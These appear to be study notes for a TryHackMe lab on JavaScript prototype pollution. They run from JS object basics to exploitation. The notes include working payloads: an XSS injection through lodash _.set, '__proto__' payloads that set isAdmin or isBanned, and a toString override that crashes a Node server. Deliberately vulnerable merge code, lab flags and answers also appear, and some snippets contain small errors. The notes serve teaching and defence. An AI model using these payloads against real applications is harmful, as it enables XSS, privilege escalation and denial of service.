
#Subscribers #Javascript 
https://tryhackme.com/room/prototypepollution

In the thrilling world of cyber security, where hackers and pentesters roam searching for vulnerabilities, there is an evolving concept known as prototype pollution. This allows bad actors to manipulate and exploit the inner workings of JavaScript applications and enables attackers to gain access to sensitive data and application backend.

While prototype pollution is most commonly discussed in the context of JavaScript, the concept can apply to any system that uses a similar [prototype-based inheritance](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain) model.

However, JavaScript's widespread use, particularly in web development, and its flexible and dynamic object model make prototype pollution a more prominent and relevant concern in this language. In contrast, [class-based inheritance](https://en.wikipedia.org/wiki/Class-based_programming) languages like Java or C++ have a different model of inheritance where classes (blueprints for objects) are typically static, and altering a class at runtime to affect all its instances is not a common practice or straightforward task.

## recap

﻿﻿Before we jump into the advanced stuff like prototype pollution, let's first understand some basic things in JavaScript. Think of **objects** as building blocks that hold information. **Inheritance** is like passing down traits from one object to another. **Functions** are like tools that can be used alone or as part of these objects. Lastly, **classes** in JavaScript are like blueprints that help us make similar things easily. Once we get these basics, we can then explore the more complex topic of prototype pollution in our room.

### Objects

﻿In JavaScript, objects are like containers that can hold different pieces of information. Imagine a social network profile as an object, where each profile has properties like name, age, and followers. You can represent this using curly braces and key-value pairs:

```js
let user = { name: 'Ben S', age: 25, followers: 200, DoB: '1/1/1990' };
```

Here, the `user` is an object with properties such as `name`, `age`, and `followers`.  These properties store specific information about the user. Objects in JavaScript enable us to organize and manage related data, making them a fundamental concept in building dynamic and interactive applications.

```js
// browser > inpect > console
console.log(user.name)
```

### Classes

In JavaScript, classes are like blueprints that help create multiple objects with similar structures and behaviours. Staying with our social network example, we can use a class to define a general user and a content creator. Classes provide a convenient way to organize and instantiate objects with shared characteristics.

```js
// Class for User 
class UserProfile { 
	constructor(name, age, followers, dob) { 
		this.name = name; 
		this.age = age; 
		this.followers = followers; 
		this.dob = dob; // Adding Date of Birth 
	} 
} 
// Class for Content Creator Profile inheriting from User 
class ContentCreatorProfile extends User { constructor(name, age, followers, dob, content, posts) { super(name, age, followers, dob); this.content = content; this.posts = posts; } } 
// Creating instances of the classes 
let regularUser = new UserProfile('Ben S', 25, 1000, '1/1/1990'); 
let contentCreator = new ContentCreatorProfile('Jane Smith', 30, 5000, '1/1/1990', 'Engaging Content', 50);
```

Now, the `User` class includes the Date of Birth (dob) as part of its properties, and the `ContentCreatorProfile` class inherits this property. When creating instances of these classes, we can provide the Date of Birth and other details. As we can see, including the Date of Birth enhances the user profiles with additional information.

### Prototype

In JavaScript, every object is linked to a prototype object, and these prototypes form a chain commonly referred to as the **prototype chain**. The prototype serves as a template or blueprint for objects. When you create an object using a constructor function or a class, JavaScript automatically sets up a link between the object and its prototype. In the context of our social network example, let's illustrate how prototypes work:

```js
// Prototype for User 
let userPrototype = { 
	greet: function() { 
		return `Hello, ${this.name}!`; 
	} 
}; 
// User Constructor Function 
function UserProfilePrototype(name, age, followers, dob) { 
let user = Object.create(userPrototype); 
user.name = name; 
user.age = age; 
user.followers = followers; 
user.dob = dob; 
return user; } 
// Creating an instance 
let regularUser = UserProfilePrototype('Ben S', 25, 1000, '1/1/1990'); 
// Using the prototype method 
console.log(regularUser.greet());
```

You can copy and play with the code in the attached VM to see how JavaScript objects work.

### Difference between Class and Prototype

Classes and prototypes in JS are two ways to achieve a similar goal: creating objects with behaviours and characteristics. Imagine you're building models of cars in your room. Using classes is like having a detailed blueprint or a set of instructions for each car model you want to develop. You follow the blueprint exactly to create each car, and all cars made from the exact blueprint are guaranteed to have the same features and behaviours. Classes in JavaScript work similarly; they provide a clear, structured way to create objects that share the same properties and methods, making them easy to understand and use.

On the other hand, prototypes are like having a basic car model and then customizing it by adding or modifying features directly on the car itself. With prototypes, you start with a simple object and then add behaviours to it by linking it to a prototype object that already has those behaviours. Objects created this way are linked through the prototype chain, allowing them to inherit behaviours from other objects. This method is more dynamic and flexible but can be harder to manage and understand than the structured approach of classes.

### Inheritance

In JavaScript, inheritance allows one object to inherit properties from another, creating a hierarchy of related objects. Continuing with our social network example, let's consider a more specific profile for a content creator. This new object can inherit properties from the general user profile, like `name` and `followers`, and add particular properties, such as `content` and `posts`.

```js
let user = { 
	name: 'Ben S', 
	age: 25, 
	followers: 1000, 
	DoB: '1/1/1990' 
}; 
// Content Creator Profile inheriting from User 
let contentCreatorProfile = Object.create(user); contentCreatorProfile.content = 'Engaging Content'; contentCreatorProfile.posts = 50;
```

Here, `contentCreatorProfile` inherits properties from the user using `Object.create()`. Now, it has specific properties like `content` and `posts` and inherits `name`, `age`, and `followers` from the general user profile, as shown below.

This way, inheritance helps create a more specialized object while reusing common properties from a parent object. JavaScript supports both classes and prototype-based inheritance.

- **Prototype-based Inheritance**: In JavaScript, every object has a prototype, and when you create a new object, you can specify its prototype. Objects inherit properties and methods from their prototype. You can use the `Object.create()` method to create a new object with a specified prototype, or you can directly modify the prototype of an existing object using its prototype property.
- **Class-based Inheritance**: JavaScript also supports classes, which provide a more familiar syntax for defining objects and inheritance. Classes in JavaScript are just syntactical sugar over JavaScript's existing prototype-based inheritance. Under the hood, classes still use prototypes.

The diagram on the right represents the prototype-based inheritance in JS:
- **Defining UserProfile Object**: We start by defining a generic `UserProfile` object that represents common properties shared by different types of profiles. In this example, `UserProfile` includes properties like email and password, which might be common to all user profiles.
- **Creating ContentCreatorProfile**: We create a specialized profile called `ContentCreatorProfile`. This profile is specific to content creators and may have additional properties or behaviours beyond those in a generic user profile. We achieve this by creating `ContentCreatorProfile` using `Object.create(UserProfile)`, which sets `UserProfile` as the prototype of `ContentCreatorProfile`.
- **Adding Additional Properties**: After creating ContentCreatorProfile, we add specific properties such as posts. This property is unique to `ContentCreatorProfile` and is not inherited from `UserProfile`.
- **Accessing Properties**: When accessing properties of `ContentCreatorProfile`, JavaScript first checks if the property exists directly on `ContentCreatorProfile`. If it doesn't find the property there, it looks up the prototype chain and checks if the property exists on `UserProfile`. If found, it returns the value from the prototype chain. So, `ContentCreatorProfile` inherits properties email and password from `UserProfile`, while also having its own unique property number of posts. This allows for a hierarchical structure where specialized profiles can inherit common properties from a generic profile while adding their specific attributes.

```
UserProfile
	email password            // prototype

ContentCreatorProfile
	number of posts
```

Let's summarize what we have discussed till now using the above diagram. The concept of prototypes plays a crucial role in implementing inheritance. Each object in JavaScript has a prototype, which serves as a blueprint for the object's properties and methods. In the above image, when we define a class like `UserProfile`, its prototype becomes the prototype of all instances created from it. This means that properties and methods defined in the `UserProfile` class are accessible to all instances of `UserProfile`. Additionally, JavaScript allows us to extend these prototypes dynamically, enabling inheritance through prototype chaining. For instance, subclasses like `ContentCreator`, `ContentDesigner`, and `Moderator` can extend the prototype of the `UserProfile` class to inherit its properties and methods. By leveraging prototypes, JavaScript provides a flexible and efficient mechanism for implementing inheritance, enabling code reuse and maintainability in object-oriented programming paradigms.

```
What is the default value of the age property in the user object?
25

What is the output once we run regularUser.greet() after executing the prototype code snippet?  "Hello, ${this.name}!", where this.name is the name of the person.

Hello, Ben S!

After executing the inheritance code snippet, what is the total number of user-defined properties in the **ContentCreatorProfile** object?  

ContentCreatorProfile = Object.create(user);

4

```

## how it works

﻿Now that we have a basic understanding of JavaScript, let's dive into Prototype Pollution using the same social network 
﻿
﻿> [!info] example 
﻿Prototype pollution is a vulnerability that arises when an attacker manipulates an object's prototype, impacting all instances of that object. In JavaScript, where prototypes facilitate inheritance, an attacker can exploit this to modify shared properties or inject malicious behaviour across objects.

> [!warning] _Prototype pollution, on its own, might not always present a directly exploitable threat. However, its true potential for harm becomes notably pronounced when it joins with other types of vulnerabilities, such as XSS and CSRF._

## A Common Example

Let's assume, we have a basic prototype for `Person` with an `introduce` method. The attacker aims to manipulate the behaviour of the `introduce` method across all instances by altering the prototype.

```js
// Base Prototype for Persons 
let personPrototype = { introduce: function() { return `Hi, I'm ${this.name}.`; } }; 
// Person Constructor Function 
function Person(name) { let person = Object.create(personPrototype); person.name = name; return person; } 
// Creating an instance 
let ben = Person('Ben');
```

What if an attacker injects malicious content into the introduce method for all instances using the `__proto__` property. In JavaScript, the `__proto__` property is a common way to access the prototype of an object, essentially pointing to the object from which it inherits properties and methods. Let's see, somehow, the attacker executes the following code using any attack vector like XSS, CSRF, etc.

```js
// Attacker's Payload 
ben.__proto__.introduce=function(){
	console.log("You've been hacked, I'm Bob");
} 
console.log(ben.introduce());
```

We will discuss in detail what exactly is happening in the background:  

- **Prototype Definition**: The Person prototype (personPrototype) is initially defined with a harmless `introduce` method, introducing the person.
- **Object Instantiation**: An instance of Person is created with the name `'Ben' (let ben = Person('Ben');)`.
- **Prototype Pollution Attack**: The attacker injects a malicious payload into the prototype's `introduce` method, changing its behaviour to display a harmful message.
- **Impact on Existing Instances**: As a result, even the existing instance (`ben`) is affected, and calling `ben.introduce()` now outputs the attacker's injected message.

This example shows how an attacker can alter the behaviour of shared methods across objects, potentially causing security risks. Preventing prototype pollution involves carefully validating input data and avoiding directly modifying prototypes with untrusted content.

```
After executing the above code, if you try to create a new person **let josh = Person('Josh')**, what would be the output of **josh.introduce()**?

let josh = Person('Josh')
print(josh.introduce() )

You've been hacked, I'm Bob

What is the name of the property that the attacker polluted?

__proto__
```

## exploitation 

### Standard Approach

As we know, numerous properties are inherently present on the Object prototype in JavaScript. Among these, the `constructor` and `__proto__` properties stand out as particularly notable targets for exploitation by threat actors. The `constructor` property points to the function that constructs an object's prototype, while `__proto__` is a reference to the prototype object that the current object directly inherits from. Malicious actors often exploit these properties to manipulate an object's prototype chain, potentially leading to prototype pollution.

### Golden Rule

The concept hinges on an attacker's ability to influence certain key parameters, such as `x` and `val`, in expressions akin to `Person[x][y] = val`. Suppose an attacker assigns `__proto__` to `x`. In that case, the attribute identified by `y` is universally set across all objects sharing the same class as the object with the value denoted by `val`.

In a more intricate scenario, when an attacker has control over `x`, `y`, and `val` in a structure like `Person[x][y][z] = val`, assigning `x` as `constructor` and `y` as `prototype` leads to a new property defined by `z` being established across all objects in the application with the assigned `val`. This latter approach necessitates a more complex arrangement of object properties, making it less prevalent in practice.

Few Important Functions

When identifying potential prototype pollution vulnerabilities, penetration testers should focus on commonly used vectors/functions susceptible to prototype pollution. A thorough examination of how an application handles object manipulation is crucial. We will understand a few important functions that an attacker can exploit, and then we will practically perform the exploitation.

- **Property Definition by Path**: Functions that set object properties based on a given path (like `object[a][b][c] = value`) can be dangerous if the path components are controlled by user input. These functions should be inspected to ensure they don't inadvertently modify the object's prototype. Consider an endpoint that allows users to update reviews about any friend.

**Initial Object Structure**

Before any updates are made, we have an initial friends array containing an object representing a friend's profile. Each profile object includes properties such as id, name, reviews, and albums.

```js
let friends = [ { id: 1, name: "testuser", age: 25, country: "UK", reviews: [], albums: [{ }], password: "xxx", } ];  
_.set(friend, input.path, input.value);
```

**Input Received from User**

The user wants to add a review for their friend. They provide a payload containing the path where the review should be added (**reviews.content**) and the review content ` (<script>alert(anycontent)</script>)`  

An attacker updates the path to target the prototype:

```js
{ "path": "reviews[0].content", "value": "&#60;script&#62;alert('anycontent')&#60;/script&#62;" };
```
We use the `_set` function from lodash to apply the payload and add the review content to the specified path within the friend's profile object. 

**Resulting Object Structure**

After executing the code, the friends array will be modified to include the user's review. However, due to a lack of proper input validation, the review content provided by the user `(<script>alert('anycontent')</script>)` was directly added to the profile object without proper sanitization.

```js
let friends = [ 
	{ 
	id: 1, 
	name: "testuser", 
	age: 25, 
	country: "UK", 
	reviews: [ "<script>alert('anycontent')</script>" ], 
	albums: [{}], 
	password: "xxx", 
	} 
];
```

Similarly, suppose the attacker wants to insert a malicious property into the friend's profile. In that case, they provide a payload containing the path where the property should be added (**isAdmin**) and the value for the malicious property (true).

```js
const payload = { "path": "isAdmin", "value": true };
```

After executing the code, the `friends` array will be modified to include the malicious property **isAdmin** in the friend's profile object. The `friends` object will have the following structure:

```js
let friends = [ 
	{ 
	id: 1, 
	name: "testuser", 
	age: 25, country: "UK", reviews: [], 
	albums: [], 
	password: "xxx", 			 
	isAdmin: true // Malicious property inserted by the attacker 
	} 
];
```

## practical example

Now, we will practically see how the attackers can exploit the vulnerability. Suppose you are working as a pentester in a firm tasked to pentest a social media application. You can access the application through the `MACHINE_IP:5000` URL with the following login credentials:

```
username: bob
password: bob@123
```

To identify prototype pollution, we will explore different functionalities of the social media app, like adding albums, sending friend requests, adding reviews, etc.

submit a review which gets saved in the database: client side & server side exploit

```html
<form action="/submit-friend-review" method="post" class="mb-4"> <h2 class="mb-3">Submit a Review</h2> <input type="hidden" name="friendId" value="1"> <div class="form-group"> <textarea class="form-control" name="reviewContent" placeholder="Write your review here" rows="3"></textarea> </div> <button type="submit" class="btn btn-primary">Submit Review</button> </form>
```

The client-side code takes the review as an input parameter and calls the API endpoint `/submit-friend-review` to add a review along with a hidden parameter `friendId`. As discussed in previous tasks, prototype pollution alone is rarely exploitable; however, once combined with other attack vectors like XSS, it can provide a better attack surface. Now, let's go through the server-side code.

```js
let friends = [ { id: 1, name: "Sabalenka", age: 25, country: "UK", reviews: [], albums: [{ name: "USA Trip", photos: "git.thm" }], password: "xxx", }, ... ... app.post("/submit-friend-review", (req, res) => { if (!req.session.user) { return res.redirect("/signin"); } const { friendId, reviewContent } = req.body; const friend = friends.find((f) => f.id === parseInt(friendId)); if (!friend) { return res.status(404).send("Friend not found"); } try { const input = JSON.parse(reviewContent); _.set(friend, input.path, payload.value); } catch (e) { } res.redirect(`/friend/${friendId}`); });
```

 This code is carrying out the following actions:

- First, it validates the logged-in user's session; if not, it redirects it to the login page.
- Then, the code extracts the parameter and validates the connection between the signed-in user and the `friendId` received in the request parameters.
- After verifying the friend's connection, the code inserts the review in the friend's object.
- The code uses the `_.set` function in the Lodash utility that allows you to set the value of a property at a given path of an object. It's a convenient way to set values on objects deeply without having to check if each level of the path exists. If a portion of the path does not exist, `_set` will create it.  
- The code analysis shows this is a prime opportunity to perform the **property definition by path** attack.
- Moving forward, let's add a friend and visit his profile to add a simple review to see if it works.
- The review is successfully added. Based on the knowledge we get from the source code review, let's prepare a payload for sending a review that will trigger an alert. We know that the friend's object has a `reviews` array where the reviews of each user are stored. The functionality to add a review works only on a friend's profile.

```js
// paste in the Submit a Review box
{"path": "reviews[0].content", "value": "<script>alert('Hacked')</script>"}
```

Now, whenever someone visits the profile of this user, the XSS attack will be triggered. In such scenarios, the attacker can even manipulate other properties that may allow admin access to the user, like `isAdmin`, `isloggedIn` etc.

In this task, we learned how the attacker can launch prototype pollution and an XSS attack using the property by definition technique. In the next task, we will continue learning some more functions.

```
What is the name of the vulnerable utility the application uses with the **_.set** function?

lodash

In the case of an expression like **test[i][j]**, what would be the controllable parameter that may lead to prototype pollution?

i
```

## exploit: property injection

Few Important Functions

- **Object Recursive Merge**: This function involves recursively merging properties from source objects into a target object. An attacker can exploit this functionality if the merge function does not validate its inputs and allows merging properties into the prototype chain. Considering the same social network example, let's assume the following code. Suppose the application has a function to merge user settings:
```js
// Vulnerable recursive merge function 
function recursiveMerge(target, source) { for (let key in source) { if (source[key] instanceof Object) { if (!target[key]) target[key] = {}; recursiveMerge(target[key], source[key]); } else { target[key] = source[key]; } } } 
// Endpoint to update user settings 
app.post('/updateSettings', (req, res) => { 
const userSettings = req.body; // User-controlled input 
recursiveMerge(globalUserSettings, userSettings); 
res.send('Settings updated!'); });
```

An attacker sends a request with a nested object containing `__proto__`:

```
An attacker sends a request with a nested object containing `__proto__`:
```

- **Object Clone**: Object cloning is a similar functionality that allows deep clone operations to copy properties from the prototype chain to another one inadvertently. Testing should ensure that these functions only clone the user-defined properties of an object and filter special keywords like __proto__, constructor, etc. A possible use case is that the application backend clones objects to create new user profiles:

Now, we will practically see how the attackers can exploit the vulnerability. Let's explore the Clone album feature. The clone album allows users to clone an album by providing a new name.

```html
<form action="/clone-album/1" method="post" class="mb-4"> <h2 class="mb-3">Clone Album of Josh</h2> <div class="form-group"> <label for="selectedAlbum">Select an Album to Clone:</label> <select class="form-control" name="selectedAlbum" id="selectedAlbum"> <option value="Trip to US"> Trip to US </option> </select> </div> <div class="form-group"> <label for="newAlbumName">New Album Name:</label> <input type="text" class="form-control" name="newAlbumName" id="newAlbumName" placeholder="Enter new album name"> </div> <button type="submit" class="btn btn-primary">Clone Album</button> </form>
```

The client-side code takes the name as input and calls the API endpoint `/clone-album/{album_ID}` to clone the album. As discussed in previous tasks, Prototype pollution alone is rarely exploitable; however, once combined with other attack vectors like XSS, it can provide a better attack surface. Now, let's go through the server-side code.

```js
app.post("/clone-album/:friendId", (req, res) => { const { friendId } = req.params; const { selectedAlbum, newAlbumName } = req.body; const friend = friends.find((f) => f.id === parseInt(friendId)); if (!friend) { console.log("Friend not found"); return res.status(404).send("Friend not found"); } const albumToClone = friend.albums.find( (album) => album.name === selectedAlbum ); if (albumToClone && newAlbumName) { let clonedAlbum = { ...albumToClone }; try { const payload = JSON.parse(newAlbumName); merge(clonedAlbum, payload); } catch (e) { } function merge(to, from) { for (let key in from) { if (typeof to[key] == "object" && typeof from[key] == "object") { merge(to[key], from[key]); } else { to[key] = from[key]; } } return to; }
```

In the above code,  the servers receive a JSON object containing the album's name, copy the album that needs to be copied into another object, and change the name of the newly created copy by calling the merge function.  

We know the merge function is an ideal candidate for prototype pollution if it blindly copies all the objects and properties without sanitising based on keys. We can see that the merge function made by the developer lacked any such sanitisation filters. What if we send a request that contains `__proto__` with a `newProperty`  and value as mentioned below:

```js
// paste in the Clone Album of <friend>
{"__proto__": {"newProperty": "hacked"}}
```

The merge function will consider the `__proto__`  as a property and will call `obj.__proto__.newProperty=value`. By doing this, `newProperty` is not added directly to the friend object. Instead, it's added to the friend object's prototype. This means `newProperty` is not visibly part of the friend's properties (like name, age, etc.) but is still accessible. Let's clone an album by visiting Josh's profile and using the above payload as an album name.

- **Effect on All Objects of the Same Type**: Since all friend objects share the same prototype (they are created from the same template or constructor), adding `newProperty` to the prototype means all friend objects now have access to newProperty. It's like adding a new feature to the template; 
- now, every object created from that template has this new feature.
- **Observing the Change**: Even though `newProperty` is not directly visible when you print the friend object, it is still there. You can access it by calling `friend.newProperty`, which will show "`testValue`".
- **How newProperty Becomes Visible**: When you add newProperty via the prototype, it doesn't exist directly on the individual objects (like each friend) but on their prototype. However, when you access a property on an object, JavaScript first looks for that property on the object itself. If it's not found, JavaScript looks up the prototype chain until it finds it (or reaches the end of the chain).
- **Rendering on Screen**: In the [EJS](https://ejs.co/) template, when you loop through the properties of a friend object using a `for...in loop` (`<% for (let key in friend) { %> ... <% } %>`) and display them, this loop iterates over all enumerable properties of the friend object, including those inherited from the prototype. Therefore, even though newProperty is not directly on the friend object but on its prototype, it still shows up in this loop and is rendered on the screen.

In this task, we have learned how to add a new property in an object's prototype to pollute the overall structure. In the next task, we will know how to crash a complete application if the developer does not take the necessary measures.

Note: To answer the following questions, visit the URL `http://10.10.94.200:8080/getFlag.php` to get the flags. You will see the following dashboard to get the flags:

```js
{"__proto__": {"isBanned": "true"}}
```

```
Flag: THM{FAKEPROPERTY_ADDED}
```

## exploit: denial of service 

### Denial of Service

Prototype pollution, a critical vulnerability in JavaScript applications, can lead to a Denial of Service (DoS) attack, among other severe consequences. This occurs when an attacker manipulates the prototype of a widely used object, causing the application to behave unexpectedly or crash altogether. In JavaScript, objects inherit properties and methods from their prototype, and altering this prototype impacts all objects that share it.

`Object.prototype.toString` method, every subsequent call to this method by any object will execute the altered behaviour. In a complex application where `toString` is frequently used, this can lead to unexpected results, potentially causing the application to malfunction. The `toString` method is universally used in JavaScript. It's automatically invoked in many contexts, especially when an object needs to be converted to a string.

If the polluted method leads to inefficient processing or an infinite loop, it can exhaust system resources, effectively causing a DoS condition. Moreover, prototype pollution can also interfere with the application's business logic. Altering essential methods or properties might trigger unhandled exceptions or errors, leading to the termination of processes or services. This could render the server unresponsive in web applications, denying service to legitimate users.

### practical example 

- Again, visit the URL `http://10.10.94.200:5000` and see if we can crash the server through any input. As discussed, we have a method `Object.prototype.toString` that converts an object to a String datatype.  
- Visit the profile page of any friend; we can see from the previous task here how the server-side code looks like

```html
<form action="/clone-album/1" method="post" class="mb-4"> <h2 class="mb-3">Clone Album of Josh</h2> <div class="form-group"> <label for="selectedAlbum">Select an Album to Clone:</label> <select class="form-control" name="selectedAlbum" id="selectedAlbum"> <option value="Trip to US"> Trip to US </option> </select> </div> <div class="form-group"> <label for="newAlbumName">New Album Name:</label> <input type="text" class="form-control" name="newAlbumName" id="newAlbumName" placeholder="Enter new album name"> </div> <button type="submit" class="btn btn-primary">Clone Album</button> </form>
```
- We see that this function is calling the merge function, which merges two objects. What if we try to send a payload that will override an existing function like `toString()`, and then if we call it on some object, it will cause abrupt behaviour for the server?  
- To prepare a payload, let's take a simple JSON code that will override the toString function as shown below:

```js
// paste in Clone Album
{"__proto__": {"toString": "Just crash the server"}}
// crashes the server
```

- Let's decode the payload once the `app.js` receives the request, parses the JSON, and assigns the `toString` function value in the `__proto__` property of the friend object.
- This creates an abrupt behaviour as `toString` is widely used among different objects. When we click on Clone Album, the application crashes, as shown below:
```
TypeError: Object.prototype.toString.call is not a function
    at Object.isRegExp (/home/ubuntu/sm/node_modules/qs/lib/utils.js:215:38)
    at normalizeParseOptions (/home/ubuntu/sm/node_modules/qs/lib/parse.js:227:64)
    at Object.module.exports [as parse] (/home/ubuntu/sm/node_modules/qs/lib/parse.js:240:19)
    at parseExtendedQueryString (/home/ubuntu/sm/node_modules/express/lib/utils.js:290:13)
    at query (/home/ubuntu/sm/node_modules/express/lib/middleware/query.js:42:19)
    at Layer.handle [as handle_request] (/home/ubuntu/sm/node_modules/express/lib/router/layer.js:95:5)
    at trim_prefix (/home/ubuntu/sm/node_modules/express/lib/router/index.js:328:13)
    at /home/ubuntu/sm/node_modules/express/lib/router/index.js:286:9
    at Function.process_params (/home/ubuntu/sm/node_modules/express/lib/router/index.js:346:12)
    at next (/home/ubuntu/sm/node_modules/express/lib/router/index.js:280:10)
```
- The `TypeError` we get is `Object.prototype.toString.call` is not a function, as we have already overridden that function using Prototype pollution.
- You can override several other built-in objects/functions like `toJSON`, `valueOf`, `constructor`, etc., but the application won't crash in all behaviours. It entirely depends on the function that you are overriding.

```
What is the flag value after crashing the server through toString()?
Flag: THM{CRA5H#D)

After overriding the built-in String function toLocaleString(), what is the flag value?

{"__proto__": {"toLocaleString": "toLocaleString()"}}

Flag: THM{OV3RRID3}

```

## automating the process

Major Issues During Identification

Identifying prototype pollution is a tricky problem in any language particularly in JavaScript, because of the way JavaScript lets one object share its features with another. Detecting this problem automatically with software tools is really hard because it's not straightforward like other common website security problems. Each website or web application is different, and figuring out where prototype pollution might happen requires someone to look closely at the website's code, understand how it works, and see where mistakes might be made.

Unlike other security issues that can be found by looking for specific patterns or signs, finding prototype pollution needs a deep dive into the website's code by a pentester/developer. It's all about understanding the complex ways objects in JavaScript can affect each other and spotting where something might go wrong. Security tools can help point out possible issues, but they can't catch everything. That's why having people who know how to read and analyze code carefully is so important.

### Few Important Scripts

Several tools and projects have been developed within the security and open-source communities to aid in the automation of finding prototype pollution vulnerabilities. Here are a few renowned GitHub repositories that provide tools, libraries, or insights into detecting prototype pollution vulnerabilities:

- **[NodeJsScan](https://github.com/ajinabraham/nodejsscan)** is a static security code scanner for Node.js applications. It includes checks for various security vulnerabilities, including prototype pollution. Integrating NodeJsScan into your development workflow can help automatically identify potential security issues in your codebase. 
- [**Prototype Pollution Scanner**](https://github.com/KathanP19/protoscan) is a tool designed to scan JavaScript code for prototype pollution vulnerabilities. It can be used to analyse codebases for patterns that are susceptible to pollution, helping developers identify and address potential security issues in their applications.
- [**PPFuzz**](https://github.com/dwisiswant0/ppfuzz) is another fuzzer designed to automate the process of detecting prototype pollution vulnerabilities in web applications. By fuzzing input vectors that might interact with object properties, `PPFuzz` can help identify points in an application that are susceptible to prototype pollution. 
- Client-side detection by [**BlackFan**](https://github.com/BlackFan/client-side-prototype-pollution) is focused on identifying prototype pollution vulnerabilities in client-side JavaScript. It includes examples of how prototype pollution can be exploited in browsers to perform XSS attacks and other malicious activities. It's a valuable resource for understanding the impact of prototype pollution on the client-side.

While identifying prototype pollution, the pentester should look for instances where user-controlled input might influence the keys or properties being merged, defined, or cloned. Verifying that the application properly sanitizes and validates such input against modifying the prototype chain is crucial in preventing prototype pollution vulnerabilities.

## mitigation

Mitigating the risks associated with prototype pollution is crucial for both pentesters and secure code developers, as the vulnerability enables attackers to manipulate an object's prototype, potentially leading to unexpected behaviour and security issues. Here are some mitigation measures for prototype pollution:

### Pentesters

- protection against vulnerable JS code Input Fuzzing and Manipulation**: Interact with user inputs extensively, especially those used to interact with prototype-based structures, and fuzz them with a variety of payloads. Look for scenarios where untrusted data can lead to prototype pollution.
- **Context Analysis and Payload Injection**: Analyze the application's codebase to understand how user inputs are used within prototype-based structures. Inject payloads into these contexts to test for prototype pollution vulnerabilities.
- **CSP Bypass and Payload Injection**: Evaluate the effectiveness of security headers such as CSP in mitigating prototype pollution. Attempt to bypass CSP restrictions and inject payloads to manipulate prototypes.
- **Dependency Analysis and Exploitation**: Conduct a thorough analysis of third-party libraries and dependencies used by the application. Identify outdated or vulnerable libraries that may introduce prototype pollution vulnerabilities. Exploit these vulnerabilities to manipulate prototypes and gain unauthorized access or perform other malicious actions.
- **Static Code Analysis**: Use static code analysis tools to identify potential prototype pollution vulnerabilities during the development phase. These tools can provide insights into insecure coding patterns and potential security risks.

### Secure Code Developers

- **Avoid Using __proto__**: Refrain from using the `__proto__` property as it is mostly susceptible to prototype pollution. Instead, use `Object.getPrototypeOf()` to access the prototype of an object in a safer manner.
- **Immutable Objects**: Design objects to be immutable when possible. This prevents unintended modifications to the prototype, reducing the impact of prototype pollution vulnerabilities.
- **Encapsulation**: Encapsulate objects and their functionalities, exposing only necessary interfaces. This can help prevent unauthorized access to object prototypes.
- **Use Safe Defaults**: When creating objects, establish safe default values and avoid relying on user inputs to set prototype properties. Initialize objects securely to minimise the risk of pollution.
- **Input Sanitization**: Sanitize and validate user inputs thoroughly. Be cautious when using user-controlled data to modify object prototypes. Apply strict input validation practices to mitigate injection risks.
- **Dependency Management**: Regularly update and monitor dependencies. Choose well-maintained libraries and frameworks, and stay informed about any security updates or patches related to prototype pollution.
- Security Headers: Implement security headers such as Content Security Policy (CSP) to control the sources from which resources can be loaded. This can help mitigate the risk of loading malicious scripts that manipulate prototypes.

By combining rigorous testing practices, secure coding principles, and ongoing security awareness, both pentesters and secure code developers can contribute to the effective mitigation of Prototype Pollution vulnerabilities in applications. Regularly updating knowledge on emerging threats and vulnerabilities is essential to avoid potential risks.

